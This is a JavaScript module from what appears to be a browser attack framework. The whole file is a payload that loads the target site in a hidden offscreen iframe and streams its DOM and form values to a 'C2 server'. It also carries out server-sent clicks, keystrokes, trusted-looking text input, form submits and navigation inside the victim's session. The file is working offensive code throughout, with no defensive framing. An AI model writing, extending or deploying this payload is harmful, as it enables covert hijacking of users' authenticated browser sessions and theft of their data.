/**
 * Client-side proxy payload module.
 *
 * Creates a hidden offscreen iframe that loads the same target URL as the main
 * loader iframe, serialises its DOM via the snapshot/delta pipeline, and streams
 * changes to the C2 server as msgpack-encoded binary frames.
 *
 * Bidirectional control:
 *   - Server → client: `event` messages containing a node ID (`nid`) and
 *     native event parameters (click, dblclick, keydown, keyup, input,
 *     focus, blur, scroll, element-scroll, wheel, contextmenu, submit).
 *     Also `navigate` to load a new URL and `viewport` to resize the hidden iframe.
 *   - Client → server: `navigated` text messages each time the hidden iframe
 *     navigates, `scroll-sync` for victim window scroll, `element-scroll-sync`
 *     for per-element scroll, `checked-sync` and `select-sync` for form state,
 *     `value-sync` for input values, `selection-sync` for text cursor/selection,
 *     `focus-sync` for Tab-driven focus changes, plus binary snapshot/delta/meta frames.
 *
 * The serialiser is created via `createSerializer()` so that it keeps its own
 * independent ID space separate from the domviewer payload's serialiser.
 *
 * Input fidelity improvements:
 *   - Phase 1: execCommand-first text input for trusted InputEvent dispatch;
 *     selection-sync; paste/cut inputType support.
 *   - Phase 2: PointerEvent dispatched alongside every MouseEvent.
 *   - Phase 3: Element-level scroll tracking via capture-phase listener;
 *     element-scroll dispatchEvent case.
 *   - Phase 4: WheelEvent and contextmenu dispatch.
 *   - Phase 5: focus-sync after Tab key.
 *   - Phase 6: contentEditable support via execCommand.
 */
import { encodeMessage } from "../../shared/codec.js";
import { createSerializer } from "../serialize.js";

/** Arrow key and navigation keys that trigger selection-sync after keydown. */
const NAVIGATION_KEYS = new Set([
  "ArrowLeft", "ArrowRight", "ArrowUp", "ArrowDown",
  "Home", "End", "PageUp", "PageDown",
]);

/** Isolated serialiser for the proxy iframe. */
let serializer = null;

let observer = null;
let pendingMutations = [];
let flushInterval = null;
let _send = null;
let _sendBinary = null;
let _log = null;
let proxyIframe = null;

// ─── Helpers ──────────────────────────────────────────────────────────────────

/**
 * Encode a message as JSON and send it as a binary frame.
 * No-op when the message is null (e.g. unchanged styles).
 * @param {object|null} msg
 */
function sendMsg(msg) {
  if (!msg || !_sendBinary) return;
  _sendBinary(encodeMessage(msg));
}

/**
 * Flush any pending mutations immediately as a microtask.
 * Called after dispatching events that are likely to cause DOM mutations
 * (input, change, click) to minimise the round-trip latency before the
 * victim's DOM change reaches the viewer.
 */
function immediateFlush() {
  if (pendingMutations.length === 0) return;
  queueMicrotask(() => {
    if (pendingMutations.length === 0) return;
    const batch = pendingMutations;
    pendingMutations = [];
    try {
      sendMsg(serializer.syncMutations(batch));
    } catch (err) {
      if (_log) _log("warn", "Proxy: immediateFlush failed, resyncing: " + err.message);
      try {
        if (proxyIframe?.contentDocument?.documentElement) {
          sendMsg(serializer.serializeFull(proxyIframe.contentDocument.documentElement));
        }
      } catch (_) {}
    }
  });
}

/**
 * Create the hidden offscreen proxy iframe and append it to the top-level
 * document (not the loader's main iframe). Using `position:fixed` with a large
 * negative left offset keeps the element laid out and rendered (so scripts and
 * styles run) without appearing on screen.
 * @param {string} url - Initial URL to load.
 * @returns {HTMLIFrameElement}
 */
function createProxyIframe(url) {
  const el = document.createElement("iframe");
  el.src = url;
  el.style.cssText = [
    "position:fixed",
    "left:-200vw",
    "top:0",
    "width:100vw",
    "height:100vh",
    "opacity:0",
    "pointer-events:none",
    "border:none",
  ].join(";");
  el.setAttribute("sandbox", "allow-scripts allow-same-origin allow-forms");
  document.body.appendChild(el);
  return el;
}

/**
 * Attach a fresh MutationObserver to the proxy iframe's document and send a
 * full DOM snapshot.  Attaches throttled scroll listeners (window-level and
 * element-level via capture phase) to stream scroll positions to the viewer.
 * Safe to call on every `load` event — disconnects any existing observer
 * before re-attaching.
 */
function attachToFrame() {
  let frameDoc;
  try {
    frameDoc = proxyIframe.contentDocument;
  } catch (_) {
    if (_log) _log("warn", "Proxy: cross-origin iframe, cannot access document");
    return;
  }
  if (!frameDoc || !frameDoc.documentElement) return;

  const currentUrl = proxyIframe.contentWindow?.location?.href || "";
  if (!currentUrl || currentUrl === "about:blank") return;
  if (_log) _log("info", "Proxy: attached to iframe: " + currentUrl);

  // Disconnect any previous observer
  if (observer) {
    observer.disconnect();
    observer = null;
  }
  pendingMutations = [];

  // Notify server of current URL
  if (_send) _send("navigated", { url: currentUrl });

  // Store base URL in serialiser state
  sendMsg(serializer.setBaseUrl(currentUrl));

  // Full DOM snapshot
  sendMsg(serializer.serializeFull(frameDoc.documentElement));

  // Async stylesheet collection
  serializer.collectStyles(frameDoc).then(sendMsg);

  observer = new MutationObserver((mutations) => {
    pendingMutations.push(...mutations);
  });

  observer.observe(frameDoc.documentElement, {
    childList: true,
    attributes: true,
    characterData: true,
    subtree: true,
  });

  const contentWindow = proxyIframe.contentWindow;
  if (contentWindow) {
    // ── Window-level scroll → viewer scroll-sync (throttled, 100ms) ───────
    // Each page navigation creates a new contentWindow, so the listener is
    // automatically cleaned up when the old window object is discarded.
    let scrollTimer = null;
    contentWindow.addEventListener(
      "scroll",
      () => {
        if (scrollTimer) return;
        scrollTimer = setTimeout(() => {
          scrollTimer = null;
          if (_send) {
            _send("scroll-sync", {
              scrollX: contentWindow.scrollX,
              scrollY: contentWindow.scrollY,
            });
          }
        }, 100);
      },
      { passive: true }
    );

    // ── Element-level scroll tracking (Phase 3) ───────────────────────────
    // Use a WeakMap to throttle each scrollable element independently.
    const elementScrollTimers = new WeakMap();
    frameDoc.addEventListener(
      "scroll",
      (e) => {
        const target = e.target;
        if (!target || target === frameDoc || target === frameDoc.documentElement) {
          // Window-level scroll is handled above via the contentWindow listener
          return;
        }
        const nid = serializer.getIdForNode(target);
        if (!nid) return;

        if (elementScrollTimers.has(target)) return;
        elementScrollTimers.set(
          target,
          setTimeout(() => {
            elementScrollTimers.delete(target);
            if (_send) {
              _send("element-scroll-sync", {
                nid,
                scrollTop: target.scrollTop,
                scrollLeft: target.scrollLeft,
              });
            }
          }, 100)
        );
      },
      { capture: true, passive: true }
    );
  }
}

// ─── Pointer event helper (Phase 2) ───────────────────────────────────────────

/**
 * Dispatch a PointerEvent that mirrors the given MouseEvent type.
 * Fired before the corresponding MouseEvent so that frameworks listening only
 * on PointerEvent (React 17+, Angular Material) receive the interaction.
 *
 * @param {Node} node - Target DOM node
 * @param {string} mouseEventType - The mouse event type being dispatched
 * @param {object} params - Mouse/pointer coordinate and modifier parameters
 */
function dispatchPointerEvent(node, mouseEventType, params) {
  // Map mouse event types to their pointer event counterparts
  const pointerMap = {
    mousedown: "pointerdown",
    mouseup: "pointerup",
    mousemove: "pointermove",
    mouseover: "pointerover",
    mouseout: "pointerout",
    mouseenter: "pointerenter",
    mouseleave: "pointerleave",
  };
  const pointerType = pointerMap[mouseEventType];
  if (!pointerType) return; // click/dblclick have no direct pointer equivalent

  node.dispatchEvent(new PointerEvent(pointerType, {
    bubbles: true,
    cancelable: true,
    view: proxyIframe.contentWindow,
    pointerId: 1,
    pointerType: "mouse",
    isPrimary: true,
    // Apply light pressure when button is held (pointerdown/pointermove with button)
    pressure: (mouseEventType === "mousedown" || (params.buttons && params.buttons > 0)) ? 0.5 : 0,
    button: params.button || 0,
    buttons: params.buttons || 0,
    clientX: params.clientX || 0,
    clientY: params.clientY || 0,
    ctrlKey: params.ctrlKey || false,
    shiftKey: params.shiftKey || false,
    altKey: params.altKey || false,
    metaKey: params.metaKey || false,
  }));
}

// ─── execCommand helper (Phase 1) ─────────────────────────────────────────────

/**
 * Attempt to apply an incremental text edit via `document.execCommand()` which
 * fires a **trusted** InputEvent from the browser engine (isTrusted === true).
 * This passes `isTrusted` checks in React, Angular, and other frameworks that
 * reject synthetic InputEvents.
 *
 * Falls back to manual .value splicing + a synthetic InputEvent when
 * execCommand returns false (e.g. element not focused, or browser disallows it).
 *
 * @param {HTMLInputElement|HTMLTextAreaElement|HTMLElement} node - Target element
 * @param {object} params - { inputType, data, value }
 * @returns {boolean} true if execCommand succeeded
 */
function applyInputViaExecCommand(node, params) {
  const frameDoc = proxyIframe.contentDocument;
  if (!frameDoc) return false;

  // Ensure the element has focus before issuing execCommand
  if (frameDoc.activeElement !== node) {
    node.focus?.();
  }

  const { inputType, data } = params;

  try {
    let ok = false;
    if (inputType === "insertText" && data != null) {
      ok = frameDoc.execCommand("insertText", false, data);
    } else if (inputType === "insertFromPaste" && data != null) {
      ok = frameDoc.execCommand("insertText", false, data);
    } else if (inputType === "deleteByCut") {
      ok = frameDoc.execCommand("delete", false, null);
    } else if (inputType === "deleteContentBackward") {
      ok = frameDoc.execCommand("delete", false, null);
    } else if (inputType === "deleteContentForward") {
      ok = frameDoc.execCommand("forwardDelete", false, null);
    } else if (inputType === "insertLineBreak" || inputType === "insertParagraph") {
      ok = frameDoc.execCommand("insertLineBreak", false, null);
    }
    return ok;
  } catch (_) {
    return false;
  }
}

/**
 * Report the current text selection/cursor position for `node` back to the
 * viewer via a `selection-sync` message.  No-op if the element has no
 * selection API (e.g. non-input elements in non-contentEditable contexts).
 * @param {string} nid
 * @param {HTMLInputElement|HTMLTextAreaElement} node
 */
function sendSelectionSync(nid, node) {
  if (!_send) return;
  try {
    const start = node.selectionStart;
    const end = node.selectionEnd;
    if (start != null && end != null) {
      _send("selection-sync", { nid, selectionStart: start, selectionEnd: end });
    }
  } catch (_) {}
}

// ─── Event dispatch ───────────────────────────────────────────────────────────

/**
 * Dispatch a native event on the real DOM node identified by `nid`.
 * Ignores the event silently if the node cannot be found.
 * @param {object} data - `{ nid, event, ...eventParams }`
 */
function dispatchEvent(data) {
  const { nid, event: eventType, ...params } = data;
  if (!nid || !eventType) return;

  const node = serializer.getNodeById(nid);
  if (!node) {
    if (_log) _log("warn", "Proxy: unknown nid for event dispatch: " + nid);
    return;
  }

  try {
    switch (eventType) {
      case "click":
      case "dblclick":
      case "mousedown":
      case "mouseup":
      case "mousemove":
      case "mouseover":
      case "mouseout":
      case "mouseenter":
      case "mouseleave": {
        // Phase 2: dispatch PointerEvent first so React 17+ and similar
        // frameworks that only listen on pointer events receive the interaction.
        dispatchPointerEvent(node, eventType, params);

        const evt = new MouseEvent(eventType, {
          bubbles: true,
          cancelable: true,
          view: proxyIframe.contentWindow,
          button: params.button || 0,
          buttons: params.buttons || 0,
          // Pass through real pointer coordinates from the viewer
          clientX: params.clientX || 0,
          clientY: params.clientY || 0,
          ctrlKey: params.ctrlKey || false,
          shiftKey: params.shiftKey || false,
          altKey: params.altKey || false,
          metaKey: params.metaKey || false,
        });
        node.dispatchEvent(evt);

        // After a click, navigate to anchor href only if the default was not
        // prevented. jQuery handlers (e.g. accordion) call return false which
        // sets defaultPrevented — this allows them to suppress navigation.
        if (eventType === "click" && !evt.defaultPrevented) {
          const anchor = node.closest ? node.closest("a") : null;
          if (anchor && anchor.href && !anchor.href.startsWith("javascript:")) {
            // Notify server immediately so the viewer URL bar updates before the
            // page loads. attachToFrame() will send a second navigated message
            // with the final URL (handles redirects) once the load event fires.
            if (_send) _send("navigated", { url: anchor.href });
            proxyIframe.contentWindow.location.href = anchor.href;
          }
        }

        // After a click on a checkbox/radio, report the new checked state
        if (eventType === "click" && node.tagName === "INPUT" &&
            (node.type === "checkbox" || node.type === "radio") && _send) {
          _send("checked-sync", { nid, checked: node.checked });
        }
        immediateFlush();
        break;
      }

      case "keydown":
      case "keyup":
      case "keypress":
        node.dispatchEvent(new KeyboardEvent(eventType, {
          bubbles: true,
          cancelable: true,
          view: proxyIframe.contentWindow,
          key: params.key || "",
          code: params.code || "",
          keyCode: params.keyCode || 0,
          charCode: params.charCode || 0,
          ctrlKey: params.ctrlKey || false,
          shiftKey: params.shiftKey || false,
          altKey: params.altKey || false,
          metaKey: params.metaKey || false,
        }));
        // Enter on INPUT: fire change and submit the parent form.
        if (eventType === "keydown" && params.key === "Enter" && node.tagName === "INPUT") {
          node.dispatchEvent(new Event("change", { bubbles: true, cancelable: true }));
          const form = node.closest("form");
          if (form) form.dispatchEvent(new Event("submit", { bubbles: true, cancelable: true }));
        }
        // Phase 5: Tab key — after the browser moves focus, report the new
        // active element so the viewer keeps focusedNidRef in sync.
        if (eventType === "keydown" && params.key === "Tab") {
          setTimeout(() => {
            const active = proxyIframe.contentDocument?.activeElement;
            if (!active || active === proxyIframe.contentDocument?.body) return;
            const activeNid = serializer.getIdForNode(active);
            if (activeNid && _send) {
              _send("focus-sync", { nid: activeNid });
            }
          }, 0);
        }
        // Phase 1: report cursor position after arrow/Home/End keydown
        if (eventType === "keydown") {
          if (NAVIGATION_KEYS.has(params.key)) {
            setTimeout(() => sendSelectionSync(nid, node), 0);
          }
        }
        break;

      case "input": {
        // Phase 1 + Phase 6: execCommand-first approach for both value-based
        // elements and contentEditable, so the InputEvent is trusted.
        const isValueBased = "value" in node;
        const isContentEditable = node.isContentEditable;

        if (isValueBased || isContentEditable) {
          if (params.value !== undefined && isValueBased) {
            // Full replacement: set value directly (used for paste from server)
            node.value = params.value;
            node.dispatchEvent(new InputEvent("input", {
              bubbles: true,
              cancelable: false,
              data: params.data ?? null,
              inputType: params.inputType || "insertText",
            }));
          } else {
            // Incremental update: try execCommand first for trusted events
            const execOk = applyInputViaExecCommand(node, params);

            if (!execOk && isValueBased) {
              // Fallback: manual .value splicing + synthetic InputEvent
              try {
                const start = node.selectionStart ?? node.value.length;
                const end = node.selectionEnd ?? node.value.length;
                const val = node.value;
                const { inputType, data } = params;
                if ((inputType === "insertText" || inputType === "insertFromPaste") && data != null) {
                  node.value = val.slice(0, start) + data + val.slice(end);
                  node.setSelectionRange(start + data.length, start + data.length);
                } else if (inputType === "deleteContentBackward" || inputType === "deleteByCut") {
                  if (start !== end) {
                    node.value = val.slice(0, start) + val.slice(end);
                    node.setSelectionRange(start, start);
                  } else if (start > 0) {
                    node.value = val.slice(0, start - 1) + val.slice(start);
                    node.setSelectionRange(start - 1, start - 1);
                  }
                } else if (inputType === "deleteContentForward") {
                  if (start !== end) {
                    node.value = val.slice(0, start) + val.slice(end);
                    node.setSelectionRange(start, start);
                  } else if (start < val.length) {
                    node.value = val.slice(0, start) + val.slice(start + 1);
                    node.setSelectionRange(start, start);
                  }
                }
              } catch (_) {}

              node.dispatchEvent(new InputEvent("input", {
                bubbles: true,
                cancelable: false,
                data: params.data ?? null,
                inputType: params.inputType || "insertText",
              }));
            }
          }

          // Send the current value back so the viewer can reflect it.
          // .value is a DOM property (not an attribute), so MutationObserver
          // never sees it — this explicit message closes the round-trip.
          // For contentEditable, rely on MutationObserver deltas instead.
          if (isValueBased && _send) {
            _send("value-sync", { nid, value: node.value });
            // Phase 1: also report cursor position after input
            setTimeout(() => sendSelectionSync(nid, node), 0);
          }

          // Checkbox/radio: also report checked state after input
          if (node.tagName === "INPUT" &&
              (node.type === "checkbox" || node.type === "radio") && _send) {
            _send("checked-sync", { nid, checked: node.checked });
          }
          immediateFlush();
        }
        break;
      }

      case "change":
        if ("value" in node && params.value !== undefined) node.value = params.value;
        if ("checked" in node && params.checked !== undefined) node.checked = params.checked;
        if ("selectedIndex" in node && params.selectedIndex !== undefined) {
          node.selectedIndex = params.selectedIndex;
        }
        node.dispatchEvent(new Event("change", { bubbles: true, cancelable: true }));
        // Report new state back to the viewer
        if (node.tagName === "INPUT" &&
            (node.type === "checkbox" || node.type === "radio") && _send) {
          _send("checked-sync", { nid, checked: node.checked });
        }
        if (node.tagName === "SELECT" && _send) {
          _send("select-sync", { nid, selectedIndex: node.selectedIndex, value: node.value });
        }
        immediateFlush();
        break;

      case "focus":
        node.focus?.();
        // Phase 1: report initial cursor position on focus
        setTimeout(() => sendSelectionSync(nid, node), 0);
        break;

      case "blur":
        node.blur?.();
        break;

      case "scroll":
        // Viewer window scroll → scroll the proxy iframe's window
        proxyIframe.contentWindow?.scrollTo(params.scrollX ?? 0, params.scrollY ?? 0);
        break;

      // Phase 3: element-level scroll from viewer
      case "element-scroll":
        if (node.scrollTop !== undefined) {
          node.scrollTop = params.scrollTop ?? 0;
          node.scrollLeft = params.scrollLeft ?? 0;
        }
        break;

      // Phase 4: wheel events
      case "wheel":
        node.dispatchEvent(new WheelEvent("wheel", {
          bubbles: true,
          cancelable: true,
          view: proxyIframe.contentWindow,
          deltaX: params.deltaX || 0,
          deltaY: params.deltaY || 0,
          deltaMode: params.deltaMode || 0,
          clientX: params.clientX || 0,
          clientY: params.clientY || 0,
          ctrlKey: params.ctrlKey || false,
          shiftKey: params.shiftKey || false,
          altKey: params.altKey || false,
          metaKey: params.metaKey || false,
        }));
        break;

      // Phase 4: contextmenu
      case "contextmenu":
        node.dispatchEvent(new MouseEvent("contextmenu", {
          bubbles: true,
          cancelable: true,
          view: proxyIframe.contentWindow,
          button: 2,
          buttons: params.buttons || 0,
          clientX: params.clientX || 0,
          clientY: params.clientY || 0,
          ctrlKey: params.ctrlKey || false,
          shiftKey: params.shiftKey || false,
          altKey: params.altKey || false,
          metaKey: params.metaKey || false,
        }));
        break;

      case "submit":
        node.dispatchEvent(new Event("submit", { bubbles: true, cancelable: true }));
        break;

      default:
        node.dispatchEvent(new Event(eventType, { bubbles: true, cancelable: true }));
    }
  } catch (err) {
    if (_log) _log("warn", "Proxy: event dispatch failed: " + err.message);
  }
}

// ─── Payload entry point ──────────────────────────────────────────────────────

/**
 * Called by the loader once the bundle has been executed.
 *
 * @param {object} params
 * @param {HTMLIFrameElement} params.iframe - The loader's main iframe element
 * @param {Function} params.send - Send a text payload message to the server
 * @param {Function} params.sendBinary - Send a raw binary frame to the server
 * @param {Function} params.on - Register a handler for server-dispatched messages
 * @param {Function} params.log - Send a diagnostic log message to the server
 * @param {string} params.baseUrl - The target origin URL
 * @param {object} [params.config] - Per-payload config (currently unused)
 */
export function init({ iframe, send, sendBinary, on, log, baseUrl }) {
  _send = send;
  _sendBinary = sendBinary;
  _log = log;

  serializer = createSerializer();

  if (_log) _log("info", "Proxy payload initialized");

  // Create a separate hidden iframe (not the main loader iframe)
  proxyIframe = createProxyIframe(baseUrl);

  proxyIframe.addEventListener("load", attachToFrame);

  // Flush mutations and collect styles every 200ms for a responsive feel.
  // This is half the previous 500ms interval to reduce perceived latency.
  flushInterval = setInterval(async () => {
    if (pendingMutations.length > 0) {
      const batch = pendingMutations;
      pendingMutations = [];
      try {
        sendMsg(serializer.syncMutations(batch));
      } catch (err) {
        if (_log) _log("warn", "Proxy: syncMutations failed, resyncing: " + err.message);
        try {
          if (proxyIframe?.contentDocument?.documentElement) {
            sendMsg(serializer.serializeFull(proxyIframe.contentDocument.documentElement));
          }
        } catch (_) {}
      }
    }
    try {
      if (proxyIframe?.contentDocument) {
        sendMsg(await serializer.collectStyles(proxyIframe.contentDocument));
      }
    } catch (_) {}
  }, 200);

  // Server → client: dispatch an event on a real DOM node
  on("event", (data) => {
    dispatchEvent(data);
  });

  // Server → client: navigate the proxy iframe to a new URL
  on("navigate", (data) => {
    if (!data?.url) return;
    try {
      // Notify server immediately so the viewer URL bar updates before the
      // page loads. attachToFrame() will send the authoritative navigated
      // message with the final URL once the load event fires.
      if (_send) _send("navigated", { url: data.url });
      proxyIframe.contentWindow.location.href = data.url;
    } catch (err) {
      if (_log) _log("warn", "Proxy: navigation failed: " + err.message);
    }
  });

  // Server → client: resize the proxy iframe to match the viewer panel
  on("viewport", (data) => {
    if (!proxyIframe || !data) return;
    if (data.width > 0) proxyIframe.style.width = data.width + "px";
    if (data.height > 0) proxyIframe.style.height = data.height + "px";
  });

  // Server → client: send a full snapshot (requested on reconnect)
  on("request-sync", () => {
    sendMsg(serializer.getSnapshot());
    if (_log) _log("info", "Proxy: full DOM state sent on request-sync");
  });
}

// ─── Cleanup ──────────────────────────────────────────────────────────────────

/**
 * Called by the loader when the payload is unloaded.
 * Tears down the hidden iframe, observer, and interval.
 */
export function destroy() {
  if (observer) {
    observer.disconnect();
    observer = null;
  }
  if (flushInterval) {
    clearInterval(flushInterval);
    flushInterval = null;
  }
  if (proxyIframe) {
    proxyIframe.removeEventListener("load", attachToFrame);
    proxyIframe.remove();
    proxyIframe = null;
  }
  if (serializer) {
    serializer.reset();
    serializer = null;
  }
  pendingMutations = [];
  _send = null;
  _sendBinary = null;
  _log = null;
}
